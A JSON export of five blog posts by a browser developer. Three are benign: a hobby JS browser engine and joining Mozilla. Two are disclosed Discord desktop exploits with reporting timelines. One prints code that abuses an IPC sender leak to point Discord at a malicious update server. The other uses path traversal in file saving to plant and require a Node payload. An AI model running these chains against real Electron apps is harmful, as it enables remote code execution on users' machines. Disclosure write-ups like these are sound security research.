[{"content":"So I started making a browser engine (for fun) a few days ago, it felt kind of inevitable after starting a JS engine, so here we are. Here\u0026rsquo;s a short rundown. Source code too!\nTry it in your browser! Screenshot of Shadow\u0026rsquo;s welcome page running inside Shadow (as of writing) What? A browser(/web) engine essentially takes in a URL(/etc) and gives you it rendered into a window for you to view and interact with. Shadow does this too, almost entirely from scratch, made in JS. It runs in your browser! Node backend soon™ too? The host browser(/etc) is only used for networking (fetch) and renderer backend (\u0026lt;canvas\u0026gt;).\nComponents of Shadow (red = external/not me)\nWhy make it? It\u0026rsquo;s just for fun, no really. Learning too. It will probably never work with 90% of websites, and that\u0026rsquo;s okay. Also it\u0026rsquo;s funny to see people react in many forms of \u0026ldquo;wtf?\u0026quot;\nScreenshot of serenityos.org running inside Shadow (left) vs Firefox (right) Pretty spot on! No list markers yet. Colors are different as UA/browser defined.\nName As with all my recent projects, the name is because I thought it was kind of funny at the time. Shadow is named after the defunct \u0026lt;shadow\u0026gt; element. I mostly stole this idea from Blink (was it intentional to name it after a dead HTML element at the time?). Also it sounds spooky and mysterious so that\u0026rsquo;s a bonus I guess?\nIt supports JavaScript??! Yes, kind of. This is quite complicated (as you can probably imagine), so I\u0026rsquo;ll do it in a separate future dedicated post if you\u0026rsquo;re interested (DM/reply me on twitter).\nWhy publish it? Why not? If someone can learn something or just find what I make fun/interesting, that makes me happy :)\nBut making a new browser engine is impossible! No. It. Isn\u0026rsquo;t! (Also I don\u0026rsquo;t really care how possible/feasible something is.)\n","date":"2023-10-27T00:00:00Z","permalink":"/introducing-shadow/","title":"Introducing Shadow"},{"content":"\u0026hellip;or I guess day 13 if you include weekends? (I don\u0026rsquo;t even watch big brother.) You can tell this is informal, right? And entirely my own opinions ;)\nWork I\u0026rsquo;ve been doing Implemented and shipped the User Activation API in my first week! Almost done lazy loading iframes now too. Patch is submitted for review as of writing. Landing that and shipping next week, probably. Rambling Headlines Subtly sacrificing anonymity and/or privacy: My real name is now obviously tied to my username in some (work) places online publicly, and I\u0026rsquo;m okay with it. I still won\u0026rsquo;t use my name publicly in most situations as it is mostly an unneeded formality (hi Xitter™), for me at least.\nVideo calls are a necessary pain: if you\u0026rsquo;re like me (going to give it a 50% chance), you\u0026rsquo;re not very comfortable with your physical appearance generally. I\u0026rsquo;ve been trying to improve this for the past year or so by going out more, etc. and it has worked quite a bit (introvert\u0026ndash;). Still not liking it most times but slowly becoming accustomed to it.\nBlogging™: I\u0026rsquo;m trying to post things (see this) now. Even if rambling and mostly meaningless.\nPositivity: I used to be quite pessimistic but this year I\u0026rsquo;ve mostly improved* that too. I try to just be uplifting because I know it makes me and (hopefully) those around me (be it colleagues, friends, or randoms) happier. I use :) probably 1000% more than before, heh. Sometimes it feels informal, but if someone thinks that, I don\u0026rsquo;t really care :) * not necessarily a bad thing but something I don\u0026rsquo;t personally seek\nGlossary glory: I\u0026rsquo;ve learnt many random internal terms over the past month. Some words make me laugh too much (foxfooding, firehose, chemspill). A lot are public! :)\nSlack or Matrix? An eternal question: Mozilla use both Slack (internal) and Matrix (public). Most engineers prefer Matrix because open-source™ and transparency, etc. Slack is still used for internal talk; important things like dog pictures.\nHow public should where you work be? This is an interesting question I have been pondering on what my \u0026ldquo;policy\u0026rdquo; should be. While I should be free to just say where I work/what I do whenever to whoever, I should probably also understand the risks. Also I don\u0026rsquo;t want to sound like I\u0026rsquo;m trying to boast/etc. However, anyone with my username can find my profiles on other sites anyway and see where. Risks?\nI guess someone could report you to your employee making up some yikes claim which could get you investigated/etc. Seems rare though? (Also quite messed up.) Someone might hate your employer for whatever reason and therefore automatically hate you. welp. Cool people are cool: I work with cool people, both in Mozilla generally and my team (still feels weird to say). They are all great, everyone is very welcoming and nice. That is it :)\n@\u0026lt;bigcorp\u0026gt;.com: Every time I see a @mozilla.com or @google.com or \u0026hellip; email to me, I still go !? internally for a second but realize that\u0026rsquo;s normal now.\nNot talking about things: I mostly try to avoid browser preference talks now. I could, there is nothing really stopping me. Just it isn\u0026rsquo;t really a good idea, and nothing good would come of it. Also triple checking before posting things publicly since affiliated™.\nWork life balance: Since beginning, I knew I should take this seriously and glad to say I have been doing so. I have mostly restricted myself to doing work/Mozilla things during my daily working hours (with the odd reply/quick fix). I also intentionally go in another room for breaks, it helps a surprising amount.\nText capitalization: I have adopted the approach for using capitals for formal/professional things. and then lack thereof for casual talking. Really, this post should be in lowercase but it is just above the threshold.\nTrying to explain my job: ~90% of people I talk to understand what I do on a basic level, I work on Firefox, the web browser. What I actually do for it though, probably \u0026lt;5%. I say \u0026ldquo;DOM\u0026rdquo; and someone either goes \u0026ldquo;oh yeah cool\u0026rdquo; or they don\u0026rsquo;t know what I\u0026rsquo;m talking about at all. For the latter, I usually say something like \u0026ldquo;I work on browser features people who make websites can use to improve them\u0026rdquo;. (wait, is this really a devops job?) Shout out to one person who I said \u0026ldquo;I work at Mozilla\u0026rdquo; to and they said \u0026ldquo;what\u0026rsquo;s Mozilla?\u0026rdquo; - I forget that it isn\u0026rsquo;t 100% known.\nThis is probably all oversharing/rambling, but I\u0026rsquo;m okay with it. (unless it ends up on hacker news or something in which case\u0026hellip; :p)\n","date":"2023-10-12T00:00:00Z","permalink":"/mozilla-chronicles-1/","title":"Mozilla Chronicles #1"},{"content":"Hey! Big news first: I join Mozilla on October 1st to work on Firefox full-time! Specifically a software engineer on the DOM Core team. I am extremely excited to work on the web platform full-time. This post covers the basics of who and how. If you have any questions feel free to DM me. (Good luck job hunters!)\nWho I go by CanadaHonk (I prefer not to share my full name publicly/obviously online). Summary of yours truly:\nI live in the UK (but have no particular allegiance) My programming knowledge is entirely self-taught in my free time. I have not been to (UK) university/etc (and do not plan to for now). My free time is spent largely on programming open source projects (my own and others, large and small). Mostly Firefox (more below), my JS compiler, and more recently Node.js. How Since about February this year, I began contributing to Gecko (Firefox\u0026rsquo;s web engine). I started by fixing some small CDP (Chrome\u0026rsquo;s remote debugging protocol) bugs I had encountered while working on a personal project. I then got hooked and did more complex things like adding some new commands/features which I found handy.\nNext I began branching out: doing a bit of work on Necko (Gecko\u0026rsquo;s network stack); and layout/Stylo (Servo\u0026rsquo;s style system in Gecko). I slowly started doing more and more layout work until I am mostly just working on that.\nFinally, I went from only smaller/simpler fixes to implementing new web platform features. Here\u0026rsquo;s a list of notable things I\u0026rsquo;ve added to Firefox this year in my free time:\n@media (scripting) (113) CSS NaN/infinity fixes + ship (114) @import supports() (115) URL.canParse() (115) \u0026lt;search\u0026gt; (118) attr() fallback (119) @media (prefers-reduced-transparency) (behind pref) @media (inverted-colors) (behind pref) NVIDIA Video Super Resolution (behind pref) If you like stats; I was the ~5th highest individual contributor this year by commits (source), as of writing, I have:\nSubmitted 93 patches Filed 80 bugs Filed 9 intents (2 prototype, 3 ship, 4 prototype+ship) A few months ago, a Mozillian suggested I try to get a job there, then I started talking with some people about a potential contract\u0026hellip; and now here we are! Still feels quite surreal. Thank you to many Mozillians for supporting me, reviewing patches, and just generally being great people! :)\n","date":"2023-09-30T00:00:00Z","permalink":"/joining-mozilla/","title":"Joining Mozilla"},{"content":"Discord\u0026rsquo;s IPC Allowlist Discord expose a wrapped version of ipcRenderer for security, see my 1-click Discord XSS to RCE for more details on Electron\u0026rsquo;s IPC. It\u0026rsquo;s implemented with a Set:\nconst discordPrefixRegex = /^DISCORD_/; function getDiscordIPCEvent(ev) { return discordPrefixRegex.test(ev) ? ev : `DISCORD_${ev}`; } const RENDERER_IPC_SEND_WHITELIST = new Set([ /* ... */ ]); function send(ev, ...args) { const prefixedEvent = getDiscordIPCEvent(ev); if (!RENDERER_IPC_SEND_WHITELIST.has(prefixedEvent)) { throw new Error(\u0026#39;cannot send this event\u0026#39;); } ipcRenderer.send(prefixedEvent, ...args); } This restricts the IPC calls we can make heavily, so it becomes not very useful to us.\nBypassing Discord\u0026rsquo;s IPC Protections With Electron\u0026rsquo;s on handler for IPC it includes the sender of the event, with Discord\u0026rsquo;s wrapper the original event is unmodified and passed through:\nfunction on(ev, callback) { ipcRenderer.on(getDiscordIPCEvent(ev), callback); } The sender allows use to bypass Discord\u0026rsquo;s protections and use IPC arbitrarily with event.sender.on, event.sender.invoke, etc. So now we have arbitary IPC, how can we get to Node execution?\nDiscord Settings Discord has a settings file, settings.json, which contain several options as key/value pairs in an object. One of these options is setting the update endpoint to update Discord\u0026rsquo;s client from (NEW_UPDATE_ENDPOINT on Windows, UPDATE_ENDPOINT on Linux/Mac). I have previously made open source recreations of Discord\u0026rsquo;s update server(s).\nNormally, Discord\u0026rsquo;s IPC protections (allowlist) prevents us from modifying it, but with our bypass we can freely do it with DISCORD_SETTINGS_SET.\nCreating a Malicious Update Server Discord\u0026rsquo;s update server is quite complex and general so I won\u0026rsquo;t go into details in this post. It uses native modules which I also explained in my 1-click Discord XSS to RCE. I made a script which compiles a server by:\nGet the payload and add it into the discord_desktop_core Recompute the hash for the module and bundle it into the expected format for the client Download the official update manifest Modify it so desktop core\u0026rsquo;s version is increased causing it to update, and the hash matches the new one with our payload injected Point desktop core\u0026rsquo;s download to our server and leave the rest to the official server Start a HTTP server on localhost with our modified manifest and desktop core Injecting Our Malicious Update Server Since we now have our malicious update server and a way to add it to the user\u0026rsquo;s settings, we can make our exploit:\nBypass Discord\u0026rsquo;s IPC protections to achieve arbitary IPC Set a malicious update endpoint for the client to use Restart so the client is forced to update (Discord\u0026rsquo;s client updates on every start) Our payload is executed Which looks like:\nDiscordNative.ipc.on(\u0026#39;DISCORD_UPDATER_HISTORY_RESPONSE\u0026#39;, function ({ sender }) { // Listen to event sender.invoke(\u0026#39;DISCORD_SETTINGS_SET\u0026#39;, \u0026#39;NEW_UPDATE_ENDPOINT\u0026#39;, \u0026#39;http://localhost:9999/\u0026#39;); // Set our custom malicious update server to be used DiscordNative.app.relaunch(); // Relaunch to force update now }); DiscordNative.ipc.send(\u0026#39;DISCORD_UPDATER_HISTORY_QUERY_AND_TRUNCATE\u0026#39;); // Trigger event so our listener is called The Fix The fixed code makes sure the event isn\u0026rsquo;t included in the callback (taken directly from the original code):\nfunction on(ev, callback) { ipcRenderer.on(getDiscordIPCEvent(ev), function () { // Sender is dangerous, do not expose. callback.apply(callback, [null, ...[...arguments].slice(1)]); }); } Report Timeline 26th July 2022: Reported to Discord via HackerOne 27th July 2022: Confirmation of a high-severity issue 16th August 2022: Fixed in Canary 19th August 2022: Fixed in Stable 2nd September 2022: Confirmation of fix from Discord 2nd September 2022: $1500 bounty from Discord ","date":"2022-10-07T00:00:00Z","permalink":"/discord-0click-xss-to-rce/","title":"Discord 0-click XSS to RCE (2022)"},{"content":"Electron Isolation Overview Discord\u0026rsquo;s desktop app is made with Electron. The (modern) Electron security model focuses on having the browser sandbox, the renderer process, and the main process. each are isolated from each other as separate processes so require some interface to communicate, like so:\nmain world (scripts inside the site) ↑ | | contextBridge | | ↓ isolated world (limited node as preload) ↑ ipcMain | | | | ipcRenderer ↓ main process (node) ipcMain and ipcRenderer are event-based ways to communicate between the renderer and main process. The renderer doesn\u0026rsquo;t have access to all capabilities and it\u0026rsquo;s generally recommended to use it largely for such communication for security.\ncontextBridge exposes functions in the preload (isolated world) to the main world in the window object.\nDiscord Native Modules Discord have their own native modules system with their updater, allowing separate modules for their purposes. The main modules they have are:\ndiscord_desktop_core - Loaded by the app (app.asar) which creates the main window with the client discord_voice - Native libraries for voice chat / screenshare / etc discord_rpc - Exposes some Node modules for creating and managing the client\u0026rsquo;s RPC server These are exposed to the main world (the Discord webapp loaded) via their own exposed context bridge, DiscordNative. Specifically, DiscordNative.nativeModules.requireModule(name):\nfunction requireModule(name) { if (!/^discord_[a-z0-9_-]+$/.test(name) \u0026amp;\u0026amp; name !== \u0026#39;erlpack\u0026#39;) { throw new Error(\u0026#39;\u0026#34;\u0026#39; + String(name) + \u0026#39;\u0026#34; is not a whitelisted native module\u0026#39;); } return require(name); } They use Node\u0026rsquo;s require, which looks scary but the input is explicitly checked to begin with discord_ or being erlpack. The paths (module.paths) which can be required are carefully controlled earlier on. However, what if we could add our own file in one of the paths which we could then require?\nDiscord Native File Saving Discord have an API in their context bridge for saving files with a UI prompt for where with DiscordNative.fileManager.saveWithDialog, this is why we need 1-click, as the user must click save themselves. We can supply our own contents, filename, and default directory. The default directory is appended to the Downloads folder for the running user. However, it isn\u0026rsquo;t sanitized or checked for path traversal, so we can give it ../../../../../ (etc) to escape to the root dir.\nAnother context bridge API, DiscordNative.fileManager.getModulePath(), gives us the path straight to an allowed path by the native module requirer. So we can combine them for a full path into the directory we want.\nBringing it all together Combining these separate functions and knowledge, we can make our exploit:\nSave file with dialog with: Filename: discord_rce.js Contents: our Node payload, for example opening calc - require('child_process').exec('calc.exe') Base path: ../../../../ (etc) + module path Require our self-written file with the native module API Node execution (profit!) Reporting 12th October 2020: Reported to Discord via HackerOne 13th October 2020: Fixed by checking path given to native file saving function 13th October 2020: Given $100 bounty ","date":"2022-10-01T00:00:00Z","permalink":"/discord-1click-xss-to-rce/","title":"Discord 1-click XSS to RCE (2020)"}]